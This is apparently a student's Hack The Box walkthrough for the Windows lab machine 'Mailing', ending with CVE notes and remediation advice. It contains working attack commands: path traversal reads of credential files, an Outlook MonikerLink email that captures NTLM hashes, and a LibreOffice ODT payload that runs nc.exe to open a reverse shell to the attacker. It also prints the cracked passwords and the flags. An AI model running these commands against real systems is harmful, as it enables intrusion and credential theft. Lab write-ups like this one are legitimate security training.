# HTB Machine: Mailing - Complete Exploitation Guide

## Machine Information
- **Name:** Mailing
- **Difficulty:** Medium
- **OS:** Windows 10 / Server 2019 (Build 19041)
- **IP:** 10.129.232.39
- **Hostname:** mailing.htb

---

## Executive Summary

This is a multi-stage Windows exploitation chain involving:
1. **CVE-2024-21413** - Microsoft Outlook MonikerLink RCE
2. **CVE-2023-2255** - LibreOffice Calc Formula Injection RCE
3. **Path Traversal/LFI** - Custom PHP vulnerability in download.php
4. **hMailServer** - Mail server as initial access vector

**User Flag:** `86965e642793df5c28ce8a1dc5456d0c`  
**Root Flag:** `b0661aa85a22f7f3cbe6a419a998229f`

---

## Phase 1: Reconnaissance & Enumeration

### Network Scanning
```bash
nmap -sV -sC --reason -Pn 10.129.232.39
```

**Key Findings:**
- Port 25/587/465: hMailServer SMTP (multiple TLS variants)
- Port 110/143/993: hMailServer POP3/IMAP
- Port 80: Microsoft IIS 10.0 (PHP 8.3.3)
- Port 135/139/445: Windows RPC/SMB

### Hostname Resolution
```bash
echo "10.129.232.39 mailing.htb" | sudo tee -a /etc/hosts
```

### Web Application Enumeration
```bash
whatweb http://mailing.htb
feroxbuster -u http://mailing.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

**Discovered:**
- `/index.php` - Company homepage with team names (Ruy Alonso, Maya Bendito, Gregory Smith)
- `/download.php` - File download endpoint (vulnerable to path traversal)
- `/assets/` - Images and background files
- `/instructions/` - Directory containing instructions.pdf

---

## Phase 2: Local File Inclusion (LFI) Exploitation

### Vulnerability Discovery
The `download.php` endpoint accepts a `file` parameter without proper sanitization.

```bash
curl -s "http://mailing.htb/download.php?file=test"
# Output: File not found.

curl -s "http://mailing.htb/download.php?file=../../../../../windows/win.ini"
# Output: [Mail] MAPI=1 (File retrieved!)
```

### Exploitation: hMailServer Configuration Leak

**Target:** hMailServer.INI stores critical admin credentials

```bash
# Method 1: URL-encoded path traversal
curl -s "http://mailing.htb/download.php?file=../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.INI"
```

**Output:**
```ini
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7

[Database]
Type=MSSQLCE
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
```

**Key Extraction:**
- Admin Password Hash (MD5): `841bb5acfa6779ae432fd7a4e6600ba7`
- Database Password (encrypted): `0a9f8ad8bf896b501dde74f08efd7e4c`

### Hash Cracking
```bash
echo "841bb5acfa6779ae432fd7a4e6600ba7" > admin_hash.txt
hashcat -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `homenetworkingadministrator`

---

## Phase 3: CVE-2024-21413 - Outlook MonikerLink RCE

### Vulnerability Overview
Microsoft Outlook Remote Code Execution via malicious file:// moniker links in emails. When a victim opens the email, Outlook forces an outbound SMB authentication attempt, which can be captured.

### Prerequisites
1. Valid SMTP credentials: `administrator@mailing.htb:homenetworkingadministrator`
2. Target mailbox: `maya@mailing.htb` (identified from website team page)
3. Responder listening on attacker IP

### Exploit Execution

**Clone the PoC:**
```bash
git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
```

**Start Responder (Linux side):**
```bash
# Find your VPN IP
ip addr show tun0
# inet 10.10.16.23/23

# Start Responder listener
sudo responder -I tun0 -v
```

**Send Malicious Email:**
```bash
python CVE-2024-21413.py \
  --server mailing.htb \
  --port 587 \
  --username administrator@mailing.htb \
  --password homenetworkingadministrator \
  --sender administrator@mailing.htb \
  --recipient maya@mailing.htb \
  --url "\\10.10.16.23\share\sploit" \
  --subject "Check this out ASAP!"
```

**Responder Output:**
```
[SMB] NTLMv2-SSP Client   : 10.129.232.39
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:940bed1dbd39e826:2B6ECB6134C606D741A91F48A90B5514:0101000000000000005668687110DD010E1AA3B5B9D3B5A1...
```

### NetNTLMv2 Hash Cracking
```bash
hashcat -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `m4y4ngs4ri`

---

## Phase 4: Initial Access - User Flag

### Evil-WinRM Login
```bash
evil-winrm -i 10.129.232.39 -u maya -p m4y4ngs4ri
```

### Retrieve User Flag
```powershell
*Evil-WinRM* PS C:\Users\maya\Desktop> cat user.txt
86965e642793df5c28ce8a1dc5456d0c
```

### User Privileges Analysis
```powershell
whoami /priv
# SeChangeNotifyPrivilege, SeUndockPrivilege, SeIncreaseWorkingSetPrivilege, SeTimeZonePrivilege
# (No SeImpersonate or SeDebugPrivilege - standard user privs)

whoami /groups
# BUILTIN\Usuarios (standard user group)
# BUILTIN\Remote Management Users (WinRM access)
```

---

## Phase 5: Privilege Escalation - CVE-2023-2255

### Vector Discovery

**Key Finding - EventHandlers.vbs:**
```bash
cat "C:\Program Files (x86)\hMailServer\Events\EventHandlers.vbs"
```

**Critical Line:**
```vbs
Function SaveAttachments(oMessage)
    Dim i, aPath, shell, filename
    Set ps = CreateObject("WScript.Shell")
    ps.Run "C:\cleanup\RunasCs.exe maya m4y4ngs4ri ""powershell.exe -c Start-ScheduledTask -TaskName MailPython"" -l 2", 0, True
End Function
```

**Exploitation Chain:**
1. hMailServer processes incoming email (runs as **SYSTEM**)
2. `SaveAttachments()` is triggered
3. It executes scheduled task: **MailPython**
4. If we control what that task does → RCE as SYSTEM

### Vulnerability: CVE-2023-2255 (LibreOffice Calc RCE)

LibreOffice Calc allows embedded Python/Basic macros in .odt/.ods files. When SYSTEM opens our malicious file, the script executes with SYSTEM privileges.

### Payload Generation

**Clone CVE-2023-2255 PoC:**
```bash
cd /home/Panha/HTB/mailing/CVE-2023-2255/
```

**Create Reverse Shell Payload:**
```bash
python3 CVE-2023-2255.py \
  --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.16.23 1337" \
  --output exploit.odt
```

### Upload Exploit to Target
```powershell
# From Kali side, upload nc.exe first
evil-winrm -i 10.129.232.39 -u maya -p m4y4ngs4ri
*Evil-WinRM* PS C:\ProgramData> upload /usr/share/seclists/Web-Shells/FuzzDB/nc.exe

# Then upload the malicious ODT
*Evil-WinRM* PS C:\Important Documents> upload /home/Panha/HTB/mailing/CVE-2023-2255/exploit.odt exploit.odt
Info: Upload successful!
```

### Trigger Exploitation

The exploit.odt will be automatically opened by hMailServer's email processing → LibreOffice processes it as SYSTEM → Python script executes → Reverse shell as SYSTEM

```bash
# Listen for reverse shell
nc -lvnp 1337

# When triggered:
# connect to [10.10.16.23] from (UNKNOWN) [10.129.232.39] 61000
# Microsoft Windows [Version 10.0.19045.4355]
```

### Retrieve Root Flag

```bash
# In SYSTEM reverse shell
C:\> cd Users\localadmin\Desktop
C:\Users\localadmin\Desktop> type root.txt
b0661aa85a22f7f3cbe6a419a998229f
```

---

## CVE Summary

### CVE-2024-21413 (Outlook MonikerLink RCE)
- **Type:** Remote Code Execution
- **Severity:** Critical
- **Vector:** Email with malicious file:// URI triggers SMB auth
- **Impact:** NetNTLMv2 hash capture, credential theft
- **Fix:** Update Microsoft Outlook

### CVE-2023-2255 (LibreOffice Calc RCE)
- **Type:** Remote Code Execution
- **Severity:** High
- **Vector:** Embedded Python/Basic macros in .odt/.ods files
- **Impact:** Arbitrary code execution when file is opened
- **Fix:** Update LibreOffice, disable macro execution

### Custom LFI (download.php)
- **Type:** Path Traversal / Arbitrary File Read
- **Severity:** Critical
- **Vector:** Unvalidated `file` parameter in download.php
- **Impact:** Information disclosure (config files, credentials)

---

## Remediation

1. **Patch hMailServer** to latest version
2. **Update Microsoft Outlook** to patch CVE-2024-21413
3. **Update LibreOffice** to patch CVE-2023-2255
4. **Secure download.php:**
   ```php
   $file = basename($_GET['file']); // Whitelist approach
   $allowed_dir = "/var/www/downloads/";
   $filepath = realpath($allowed_dir . $file);
   if (strpos($filepath, realpath($allowed_dir)) !== 0) {
       die("Access denied");
   }
   ```
5. **Disable macro execution** in LibreOffice
6. **Enable Protected View** in Outlook
7. **Implement WAF** rules for path traversal patterns

---

## Timeline

| Phase | Duration | Action |
|-------|----------|--------|
| Recon | 2 min | nmap scan, web enum |
| LFI | 5 min | Discover & exploit download.php |
| Hash Crack | 10 min | Crack admin MD5 + capture/crack NetNTLMv2 |
| User Access | 3 min | RDP/WinRM login, grab user flag |
| Privesc Prep | 5 min | Discover EventHandlers.vbs, generate payload |
| Root Access | 2 min | Trigger exploit, get reverse shell |
| **Total** | **~30 min** | Full machine compromise |

---

## Key Learnings

1. **Email as attack surface** - Mail servers often trusted; CVE-2024-21413 exploits Outlook's auto-processing
2. **Defense-in-depth failure** - Multiple small vulnerabilities chain into RCE
3. **Configuration leakage** - hMailServer.INI exposed via LFI leaks admin creds
4. **Macro security** - LibreOffice macros dangerous when untrusted files opened as privileged user
5. **Scheduled tasks** - Often overlooked privesc vector if writable/triggerable

---

## Tools Used

- **nmap** - Network reconnaissance
- **curl/wget** - HTTP requests & file download
- **hashcat** - Hash cracking (MD5, NTLMv2)
- **Responder** - LLMNR/NetBIOS poisoning & hash capture
- **evil-winrm** - Windows Remote Management shell
- **CVE-2024-21413 PoC** - Outlook MonikerLink exploit
- **CVE-2023-2255 PoC** - LibreOffice Calc RCE exploit
- **nc.exe** - Netcat for reverse shells

---

## References

- CVE-2024-21413: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
- CVE-2023-2255: https://github.com/Hacking-Notes/Privilege-Escalation/blob/main/Windows/CVE-2023-2255.md
- hMailServer: https://www.hmailserver.com
- 0xdf writeup: https://0xdf.gitlab.io/2024/09/07/htb-mailing.html

---

**Author:** Nhakachh (CADT Year 3, Techo Startup Center)  
**Date:** July 10, 2026  
**Status:** Fully Pwned ✓
